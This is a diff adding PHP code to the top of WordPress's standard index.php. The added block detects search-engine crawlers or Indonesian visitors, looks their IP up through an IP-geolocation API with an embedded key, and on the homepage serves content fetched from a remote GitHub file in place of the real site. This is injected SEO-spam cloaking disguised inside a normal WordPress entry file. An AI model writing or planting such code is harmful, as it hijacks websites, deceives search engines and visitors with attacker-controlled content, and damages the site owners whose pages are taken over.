@@ -1,0 +1,75 @@
+<?php
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        return $_SERVER['HTTP_CF_CONNECTING_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+
+function getVisitorCountry() {
+    $ip = getUserIP();
+    $api_url = 'https://pro.ip-api.com/json/$ip?key=FMjb5N6z7rcJ8yt';
+
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $api_url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($curl);
+
+    if (curl_errno($curl)) {
+        return 'Error: ' . curl_error($curl);
+    }
+
+    curl_close($curl);
+    $data = json_decode($response, true);
+
+    return (isset($data['status']) && $data['status'] === 'success' && isset($data['country'])) 
+        ? $data['country'] 
+        : 'Country not found';
+}
+
+function isHomePage() {
+    return ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php');
+}
+
+function isGoogleCrawler() {
+    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+    $bots = ['googlebot', 'telegrambot', 'bingbot', 'google-site-verification', 'google-inspectiontool', 'ahrefsbot', 'AhrefsSiteAudit'];
+
+    foreach ($bots as $bot) {
+        if (strpos($userAgent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if ((isGoogleCrawler() || getVisitorCountry() === 'Indonesia') && isHomePage()) {
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, 'https://raw.githubusercontent.com/harleytou121-ctrl/clok/refs/heads/main/mpl-blog.txt');
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    echo $content;
+    exit;
+}
+?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
